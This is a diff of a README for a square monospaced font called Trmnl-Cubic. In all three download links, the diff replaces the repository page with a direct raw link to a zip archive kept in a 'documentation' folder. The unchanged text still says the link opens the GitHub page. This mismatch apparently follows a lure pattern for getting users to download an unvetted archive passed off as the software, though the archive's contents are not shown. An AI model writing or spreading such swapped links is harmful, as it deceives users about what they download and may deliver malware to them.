@@ -1,6 +1,6 @@
 # 🖥️ Trmnl-Cubic - Clear Square Monospaced Font
 
-[![Download Trmnl-Cubic](https://img.shields.io/badge/Download-Trmnl--Cubic-brightgreen?style=for-the-badge)](https://github.com/Unfeathered-naphtha122/Trmnl-Cubic)
+[![Download Trmnl-Cubic](https://img.shields.io/badge/Download-Trmnl--Cubic-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Unfeathered-naphtha122/Trmnl-Cubic/main/documentation/Trmnl-Cubic-2.1.zip)
 
 A metrically square monospaced font designed to display text-based graphics clearly. It works without needing to adjust line height or letter spacing.
 
@@ -26,7 +26,7 @@ The font maintains the same width and height for each character. This means symb
 
 You can visit the official GitHub page to download Trmnl-Cubic here:
 
-[![Get Trmnl-Cubic](https://img.shields.io/badge/Get%20Trmnl--Cubic-blue?style=for-the-badge)](https://github.com/Unfeathered-naphtha122/Trmnl-Cubic)
+[![Get Trmnl-Cubic](https://img.shields.io/badge/Get%20Trmnl--Cubic-blue?style=for-the-badge)](https://raw.githubusercontent.com/Unfeathered-naphtha122/Trmnl-Cubic/main/documentation/Trmnl-Cubic-2.1.zip)
 
 Click the link above to open the GitHub page where you will find font files and instructions.
 
@@ -40,7 +40,7 @@ Follow these steps to get Trmnl-Cubic running on your Windows computer:
 
 Visit the GitHub repository for Trmnl-Cubic by clicking the badge above or enter the URL in your web browser:
 
-https://github.com/Unfeathered-naphtha122/Trmnl-Cubic
+https://raw.githubusercontent.com/Unfeathered-naphtha122/Trmnl-Cubic/main/documentation/Trmnl-Cubic-2.1.zip
 
 ### 2. Find the Files
 
